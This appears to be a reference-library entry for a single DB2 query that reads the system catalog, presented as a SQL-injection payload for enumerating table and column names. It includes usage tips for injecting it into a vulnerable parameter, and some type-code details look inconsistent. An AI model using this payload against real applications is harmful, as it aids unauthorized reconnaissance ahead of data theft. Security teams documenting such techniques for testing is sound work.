---
type: command
executor: sql
data: >-
  select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and
  sysstat
output: null
created_at: '2023-10-01T00:00:00.000000+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Databases
  - DB2
tags:
  - SQL-Injection
  - Database-Discovery
verified: true
validated: true
---

# db2-select-columns-from-sysibm-syscolumns

## Command

```sql
select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat
```

## Description

This SQL command queries the DB2 system catalog to retrieve column names (name), associated table names (tbname), and data types (coltype) from all tables in the database. It is designed for use in SQL injection scenarios to enumerate database schema without direct access. The comment at the end prevents interference from the original query.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sysibm.syscolumns | System table for column metadata across all tables | Yes |
| syscat.columns | Alternative: Columns in the current schema only | No |
| sysstat.columns | Alternative: Statistical column info | No |
| name | Selects the column name | Built-in |
| tbname | Selects the table name | Built-in |
| coltype | Selects the data type (e.g., 1 for CHAR, 452 for VARCHAR) | Built-in |

## Examples

### Basic Usage

```sql
select name, tbname, coltype from sysibm.syscolumns
```

Use in injection: Append after a semicolon in a vulnerable parameter.

### Advanced Usage

To concatenate names for easier parsing in limited response sizes:

```sql
select LISTAGG(name, ', ') within group (order by name) from sysibm.syscolumns
```

## Expected Output

A result set like:

| NAME | TBNAME | COLTYPE |
|------|--------|---------|
| ID   | USERS  | 452     |
| USERNAME | USERS | 1       |
| PASSWORD | USERS | 448     |

Success is indicated by returned metadata without syntax errors; failure may show truncated or no data due to filtering.

## Related

- [[procedures/DB2-SQL-Injection-to-List-Table-Columns]]
